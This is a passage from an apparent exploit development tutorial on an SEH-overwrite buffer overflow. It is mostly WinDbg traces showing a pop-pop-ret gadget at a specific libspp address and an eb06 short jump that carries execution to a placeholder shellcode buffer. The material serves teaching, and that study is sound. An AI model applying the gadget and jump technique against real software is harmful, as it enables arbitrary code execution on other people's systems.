</span></span><span style="display:flex;"><span>libspp<span style="color:#f92672">!</span>pcre_exec<span style="color:#f92672">+</span><span style="color:#ae81ff">0x16460</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1015</span>a2f0 <span style="color:#ae81ff">58</span>              pop     eax
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1015</span>a2f1 <span style="color:#ae81ff">5</span>b              pop     ebx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1015</span>a2f2 c3              ret
</span></span></code></pre></div><p>Now, let&rsquo;s examine what will happen: There will be an exception, the first handler won&rsquo;t be able to manage it and jump to the second handler, which we have modified. The handler address is at our set of pop, pop, ret instructions, and that should point to our shellcode, which we saw that is stored as the third parameter on the stack.</p>
<p>Let&rsquo;s put a breapoint on our &ldquo;pop, pop, ret&rdquo; chain:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">010</span><span style="color:#f92672">&gt;</span> bp <span style="color:#ae81ff">0x1015a2f0</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">010</span><span style="color:#f92672">&gt;</span> g
</span></span><span style="display:flex;"><span>Breakpoint <span style="color:#ae81ff">0</span> hit
</span></span><span style="display:flex;"><span>eax<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> ebx<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> ecx<span style="color:#f92672">=</span><span style="color:#ae81ff">1015</span>a2f0 edx<span style="color:#f92672">=</span><span style="color:#ae81ff">770</span>c6270 esi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> edi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>eip<span style="color:#f92672">=</span><span style="color:#ae81ff">1015</span>a2f0 esp<span style="color:#f92672">=</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span>df440 ebp<span style="color:#f92672">=</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span>df460 iopl<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>         nv up ei pl zr na pe nc
</span></span><span style="display:flex;"><span>cs<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>b  ss<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  ds<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  es<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  fs<span style="color:#f92672">=</span><span style="color:#ae81ff">003</span>b  gs<span style="color:#f92672">=</span><span style="color:#ae81ff">0000</span>             efl<span style="color:#f92672">=</span><span style="color:#ae81ff">00000246</span>
</span></span><span style="display:flex;"><span>libspp<span style="color:#f92672">!</span>pcre_exec<span style="color:#f92672">+</span><span style="color:#ae81ff">0x16460</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1015</span>a2f0 <span style="color:#ae81ff">58</span>              pop     eax
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">010</span><span style="color:#f92672">&gt;</span> r
</span></span><span style="display:flex;"><span>eax<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> ebx<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> ecx<span style="color:#f92672">=</span><span style="color:#ae81ff">1015</span>a2f0 edx<span style="color:#f92672">=</span><span style="color:#ae81ff">770</span>c6270 esi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> edi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>eip<span style="color:#f92672">=</span><span style="color:#ae81ff">1015</span>a2f0 esp<span style="color:#f92672">=</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span>df440 ebp<span style="color:#f92672">=</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span>df460 iopl<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>         nv up ei pl zr na pe nc
</span></span><span style="display:flex;"><span>cs<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>b  ss<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  ds<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  es<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  fs<span style="color:#f92672">=</span><span style="color:#ae81ff">003</span>b  gs<span style="color:#f92672">=</span><span style="color:#ae81ff">0000</span>             efl<span style="color:#f92672">=</span><span style="color:#ae81ff">00000246</span>
</span></span><span style="display:flex;"><span>libspp<span style="color:#f92672">!</span>pcre_exec<span style="color:#f92672">+</span><span style="color:#ae81ff">0x16460</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1015</span>a2f0 <span style="color:#ae81ff">58</span>              pop     eax
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">010</span><span style="color:#f92672">&gt;</span> t
</span></span><span style="display:flex;"><span>eax<span style="color:#f92672">=</span><span style="color:#ae81ff">770</span>c6252 ebx<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> ecx<span style="color:#f92672">=</span><span style="color:#ae81ff">1015</span>a2f0 edx<span style="color:#f92672">=</span><span style="color:#ae81ff">770</span>c6270 esi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> edi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>eip<span style="color:#f92672">=</span><span style="color:#ae81ff">1015</span>a2f1 esp<span style="color:#f92672">=</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span>df444 ebp<span style="color:#f92672">=</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span>df460 iopl<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>         nv up ei pl zr na pe nc
</span></span><span style="display:flex;"><span>cs<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>b  ss<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  ds<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  es<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  fs<span style="color:#f92672">=</span><span style="color:#ae81ff">003</span>b  gs<span style="color:#f92672">=</span><span style="color:#ae81ff">0000</span>             efl<span style="color:#f92672">=</span><span style="color:#ae81ff">00000246</span>
</span></span><span style="display:flex;"><span>libspp<span style="color:#f92672">!</span>pcre_exec<span style="color:#f92672">+</span><span style="color:#ae81ff">0x16461</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1015</span>a2f1 <span style="color:#ae81ff">5</span>b              pop     ebx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">010</span><span style="color:#f92672">&gt;</span> t
</span></span><span style="display:flex;"><span>eax<span style="color:#f92672">=</span><span style="color:#ae81ff">770</span>c6252 ebx<span style="color:#f92672">=</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span>df540 ecx<span style="color:#f92672">=</span><span style="color:#ae81ff">1015</span>a2f0 edx<span style="color:#f92672">=</span><span style="color:#ae81ff">770</span>c6270 esi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> edi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>eip<span style="color:#f92672">=</span><span style="color:#ae81ff">1015</span>a2f2 esp<span style="color:#f92672">=</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span>df448 ebp<span style="color:#f92672">=</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span>df460 iopl<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>         nv up ei pl zr na pe nc
</span></span><span style="display:flex;"><span>cs<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>b  ss<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  ds<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  es<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  fs<span style="color:#f92672">=</span><span style="color:#ae81ff">003</span>b  gs<span style="color:#f92672">=</span><span style="color:#ae81ff">0000</span>             efl<span style="color:#f92672">=</span><span style="color:#ae81ff">00000246</span>
</span></span><span style="display:flex;"><span>libspp<span style="color:#f92672">!</span>pcre_exec<span style="color:#f92672">+</span><span style="color:#ae81ff">0x16462</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1015</span>a2f2 c3              ret
</span></span></code></pre></div><p>Now the next step will be a &ldquo;ret&rdquo;, which will return the instruction flow to what the top of the stack has. Let&rsquo;s see the top of the stack:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">010</span><span style="color:#f92672">&gt;</span> dd <span style="color:#a6e22e">poi</span>(esp)
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span>dff44  <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">1015</span>a2f0 <span style="color:#ae81ff">43434343</span> <span style="color:#ae81ff">43434343</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span>dff54  <span style="color:#ae81ff">43434343</span> <span style="color:#ae81ff">43434343</span> <span style="color:#ae81ff">43434343</span> <span style="color:#ae81ff">43434343</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span>dff64  <span style="color:#ae81ff">43434343</span> <span style="color:#ae81ff">43434343</span> <span style="color:#ae81ff">43434343</span> <span style="color:#ae81ff">43434343</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span>dff74  <span style="color:#ae81ff">43434343</span> <span style="color:#ae81ff">43434343</span> <span style="color:#ae81ff">43434343</span> <span style="color:#ae81ff">43434343</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span>dff84  <span style="color:#ae81ff">43434343</span> <span style="color:#ae81ff">43434343</span> <span style="color:#ae81ff">43434343</span> <span style="color:#ae81ff">43434343</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span>dff94  <span style="color:#ae81ff">43434343</span> <span style="color:#ae81ff">43434343</span> <span style="color:#ae81ff">43434343</span> <span style="color:#ae81ff">43434343</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span>dffa4  <span style="color:#ae81ff">43434343</span> <span style="color:#ae81ff">43434343</span> <span style="color:#ae81ff">43434343</span> <span style="color:#ae81ff">43434343</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span>dffb4  <span style="color:#ae81ff">43434343</span> <span style="color:#ae81ff">43434343</span> <span style="color:#ae81ff">43434343</span> <span style="color:#ae81ff">43434343</span>
</span></span></code></pre></div><p>After executing the ret instruction, we will point to 008dff44, which is at the start of the <code>_EXCEPTION_REGISTRATION_RECORD</code> structure. That structure had 41414141 as the &ldquo;Next&rdquo; member address, and the &ldquo;Handler&rdquo; address. The next is our shellcode.</p>
<p>The bad thing is that right now we don&rsquo;t exactly land on our shellcode.
We land on the following instructions:</p>
<ul>
<li>41 41 41 41 (or whatever we put in our buffer)</li>
<li>4 bytes corresponding of the pop, pop, ret address we used</li>
<li>Our shellcode.</li>
</ul>
<p>If we analyze the instructions, we see that the &ldquo;pop, pop, ret&rdquo; address is malformed and takes 2 more bytes, resulting in another instruction when executed as code instead of an address.
Because this instruction uses part of our buffer as a destination adress, and this address is not mapped, this will trigger an access violation and break our exploit:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">007</span><span style="color:#f92672">&gt;</span> t
</span></span><span style="display:flex;"><span>eax<span style="color:#f92672">=</span><span style="color:#ae81ff">771</span>a6252 ebx<span style="color:#f92672">=</span><span style="color:#ae81ff">0091f</span><span style="color:#ae81ff">540</span> ecx<span style="color:#f92672">=</span><span style="color:#ae81ff">1015</span>a2f0 edx<span style="color:#f92672">=</span><span style="color:#ae81ff">771</span>a6270 esi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> edi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>eip<span style="color:#f92672">=</span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">44</span> esp<span style="color:#f92672">=</span><span style="color:#ae81ff">0091f</span><span style="color:#ae81ff">44</span>c ebp<span style="color:#f92672">=</span><span style="color:#ae81ff">0091f</span><span style="color:#ae81ff">460</span> iopl<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>         nv up ei pl zr na pe nc
</span></span><span style="display:flex;"><span>cs<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>b  ss<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  ds<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  es<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  fs<span style="color:#f92672">=</span><span style="color:#ae81ff">003</span>b  gs<span style="color:#f92672">=</span><span style="color:#ae81ff">0000</span>             efl<span style="color:#f92672">=</span><span style="color:#ae81ff">00000246</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">44</span> <span style="color:#ae81ff">41</span>              inc     ecx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">007</span><span style="color:#f92672">&gt;</span> u eip L8
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">44</span> <span style="color:#ae81ff">41</span>              inc     ecx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">45</span> <span style="color:#ae81ff">41</span>              inc     ecx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">46</span> <span style="color:#ae81ff">41</span>              inc     ecx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">47</span> <span style="color:#ae81ff">41</span>              inc     ecx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">48</span> f0a215104343    lock mov byte ptr ds:[<span style="color:#ae81ff">43431015</span>h],al
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">4</span>e <span style="color:#ae81ff">43</span>              inc     ebx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff4f</span> <span style="color:#ae81ff">43</span>              inc     ebx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">50</span> <span style="color:#ae81ff">43</span>              inc     ebx
</span></span></code></pre></div><p>But remember we have 4 bytes corresponding to the &ldquo;Next&rdquo; parameter that right now are 41 41 41 41.
We can replace those bytes with an instruction that will jump to our shellcode, skipping the four bytes of the pop, pop, ret memory address which cause problems.
This is known as a &ldquo;short jump&rdquo; in assembly, also known as a short relative jump.
The first opcode of the short jump is 0xEB and the second opcode is the offset in bytes.
The offset in bytes is 0x00 to 0x7F for forward short jumps, and 0x80 to 0xFF to backwards short jumps.</p>
<p>Let&rsquo;s see the formula of the short jump:
<code>JMP AddressÂ +Â 2Â +Â Second_Byte_valueÂ =Â Next_Instruction_Address</code></p>
<p>It&rsquo;s basically a JMP (EB) + 2 bytes + the offset in bytes we want to jump.  Here are some examples:</p>
<table>
  <thead>
      <tr>
          <th><strong>AddressÂ Â Code</strong></th>
          <th><strong>Instruction</strong></th>
          <th><strong>Formula Examples</strong></th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td><strong>0100Â  Â EB 03</strong></td>
          <td><strong>JMP Â 0105</strong></td>
          <td><strong>100h + 2 + 03h = 105h</strong></td>
      </tr>
      <tr>
          <td><strong>0152Â  Â EB 23</strong></td>
          <td><strong>JMP Â 0177</strong></td>
          <td><strong>152h + 2 + 23h = 177h</strong></td>
      </tr>
      <tr>
          <td><strong>0173Â Â Â EB 47</strong></td>
          <td><strong>JMP Â 01BC</strong></td>
          <td><strong>173h + 2 + 47h = 1BCh</strong></td>
      </tr>
      <tr>
          <td><strong>0200Â Â  EB 7F</strong></td>
          <td><strong>JMP Â 0281</strong></td>
          <td><strong>200h + 2 + 7Fh = 281h</strong></td>
      </tr>
  </tbody>
</table>
<p>In the previous example, we want to jump to 0091ff4c, which is the start of our shellcode.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">007</span><span style="color:#f92672">&gt;</span> dds eip L4
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">44</span>  <span style="color:#ae81ff">41414141</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">48</span>  <span style="color:#ae81ff">1015</span>a2f0 libspp<span style="color:#f92672">!</span>pcre_exec<span style="color:#f92672">+</span><span style="color:#ae81ff">0x16460</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">4</span>c  <span style="color:#ae81ff">43434343</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">50</span>  <span style="color:#ae81ff">43434343</span>
</span></span></code></pre></div><p>We can replace the instruction in 0091ff44 to a &ldquo;jmp 0x0091ff4c&rdquo;.
We can do this in WinGdb with the &ldquo;a&rdquo; command, replacing the actual EIP for our instruction, like live patching:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">007</span><span style="color:#f92672">&gt;</span> dds eip L4
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">44</span>  <span style="color:#ae81ff">41414141</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">48</span>  <span style="color:#ae81ff">1015</span>a2f0 libspp<span style="color:#f92672">!</span>pcre_exec<span style="color:#f92672">+</span><span style="color:#ae81ff">0x16460</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">4</span>c  <span style="color:#ae81ff">43434343</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">50</span>  <span style="color:#ae81ff">43434343</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">007</span><span style="color:#f92672">&gt;</span> a
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">44</span> jmp <span style="color:#ae81ff">0x0091ff4c</span>
</span></span><span style="display:flex;"><span>jmp <span style="color:#ae81ff">0x0091ff4c</span>
</span></span></code></pre></div><p>Let&rsquo;s inspect how the debugger translated such JMP instruction, and confirm it&rsquo;s a short jump:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">007</span><span style="color:#f92672">&gt;</span> u eip
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">44</span> eb06            jmp     <span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">4</span>c
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">46</span> <span style="color:#ae81ff">41</span>              inc     ecx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">47</span> <span style="color:#ae81ff">41</span>              inc     ecx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">48</span> f0a215104343    lock mov byte ptr ds:[<span style="color:#ae81ff">43431015</span>h],al
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">4</span>e <span style="color:#ae81ff">43</span>              inc     ebx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff4f</span> <span style="color:#ae81ff">43</span>              inc     ebx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">50</span> <span style="color:#ae81ff">43</span>              inc     ebx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">51</span> <span style="color:#ae81ff">43</span>              inc     ebx
</span></span></code></pre></div><p>It&rsquo;s a EB06, meaning that it jumps 4 bytes offset (remember that was EB + 02 bytes + offset bytes).
Exactly, it&rsquo;s skipping the 4 bytes corresponding to the pop, pop, ret instruction at 0091ff48!</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">007</span><span style="color:#f92672">&gt;</span> dds eip L4
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">44</span>  <span style="color:#ae81ff">414106</span>eb
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">48</span>  <span style="color:#ae81ff">1015</span>a2f0 libspp<span style="color:#f92672">!</span>pcre_exec<span style="color:#f92672">+</span><span style="color:#ae81ff">0x16460</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">4</span>c  <span style="color:#ae81ff">43434343</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">50</span>  <span style="color:#ae81ff">43434343</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">007</span><span style="color:#f92672">&gt;</span> u eip
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">44</span> eb06            jmp     <span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">4</span>c
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">46</span> <span style="color:#ae81ff">41</span>              inc     ecx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">47</span> <span style="color:#ae81ff">41</span>              inc     ecx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">48</span> f0a215104343    lock mov byte ptr ds:[<span style="color:#ae81ff">43431015</span>h],al
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">4</span>e <span style="color:#ae81ff">43</span>              inc     ebx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff4f</span> <span style="color:#ae81ff">43</span>              inc     ebx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">50</span> <span style="color:#ae81ff">43</span>              inc     ebx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">51</span> <span style="color:#ae81ff">43</span>              inc     ebx
</span></span></code></pre></div><p>Instead of 41414141, we have to insert eb069090 (2 nops at the end). Remember that we have to insert them in little endian. But as they are nops, we can do 90 90 eb 06, or eb 06 90 90.</p>
<p>Replacing this in our payload leads us to now doing a NOP, NOP, and the relative jump to our code:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span> t
</span></span><span style="display:flex;"><span>eax<span style="color:#f92672">=</span><span style="color:#ae81ff">771</span>a6252 ebx<span style="color:#f92672">=</span><span style="color:#ae81ff">0172f</span><span style="color:#ae81ff">540</span> ecx<span style="color:#f92672">=</span><span style="color:#ae81ff">1015</span>a2f0 edx<span style="color:#f92672">=</span><span style="color:#ae81ff">771</span>a6270 esi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> edi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>eip<span style="color:#f92672">=</span><span style="color:#ae81ff">1015</span>a2f2 esp<span style="color:#f92672">=</span><span style="color:#ae81ff">0172f</span><span style="color:#ae81ff">448</span> ebp<span style="color:#f92672">=</span><span style="color:#ae81ff">0172f</span><span style="color:#ae81ff">460</span> iopl<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>         nv up ei pl zr na pe nc
</span></span><span style="display:flex;"><span>cs<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>b  ss<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  ds<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  es<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  fs<span style="color:#f92672">=</span><span style="color:#ae81ff">003</span>b  gs<span style="color:#f92672">=</span><span style="color:#ae81ff">0000</span>             efl<span style="color:#f92672">=</span><span style="color:#ae81ff">00000246</span>
</span></span><span style="display:flex;"><span>libspp<span style="color:#f92672">!</span>pcre_exec<span style="color:#f92672">+</span><span style="color:#ae81ff">0x16462</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1015</span>a2f2 c3              ret
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span> t
</span></span><span style="display:flex;"><span>eax<span style="color:#f92672">=</span><span style="color:#ae81ff">771</span>a6252 ebx<span style="color:#f92672">=</span><span style="color:#ae81ff">0172f</span><span style="color:#ae81ff">540</span> ecx<span style="color:#f92672">=</span><span style="color:#ae81ff">1015</span>a2f0 edx<span style="color:#f92672">=</span><span style="color:#ae81ff">771</span>a6270 esi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> edi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>eip<span style="color:#f92672">=</span><span style="color:#ae81ff">0172ff</span><span style="color:#ae81ff">44</span> esp<span style="color:#f92672">=</span><span style="color:#ae81ff">0172f</span><span style="color:#ae81ff">44</span>c ebp<span style="color:#f92672">=</span><span style="color:#ae81ff">0172f</span><span style="color:#ae81ff">460</span> iopl<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>         nv up ei pl zr na pe nc
</span></span><span style="display:flex;"><span>cs<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>b  ss<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  ds<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  es<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  fs<span style="color:#f92672">=</span><span style="color:#ae81ff">003</span>b  gs<span style="color:#f92672">=</span><span style="color:#ae81ff">0000</span>             efl<span style="color:#f92672">=</span><span style="color:#ae81ff">00000246</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0172ff</span><span style="color:#ae81ff">44</span> <span style="color:#ae81ff">90</span>              nop
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span> t
</span></span><span style="display:flex;"><span>eax<span style="color:#f92672">=</span><span style="color:#ae81ff">771</span>a6252 ebx<span style="color:#f92672">=</span><span style="color:#ae81ff">0172f</span><span style="color:#ae81ff">540</span> ecx<span style="color:#f92672">=</span><span style="color:#ae81ff">1015</span>a2f0 edx<span style="color:#f92672">=</span><span style="color:#ae81ff">771</span>a6270 esi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> edi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>eip<span style="color:#f92672">=</span><span style="color:#ae81ff">0172ff</span><span style="color:#ae81ff">45</span> esp<span style="color:#f92672">=</span><span style="color:#ae81ff">0172f</span><span style="color:#ae81ff">44</span>c ebp<span style="color:#f92672">=</span><span style="color:#ae81ff">0172f</span><span style="color:#ae81ff">460</span> iopl<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>         nv up ei pl zr na pe nc
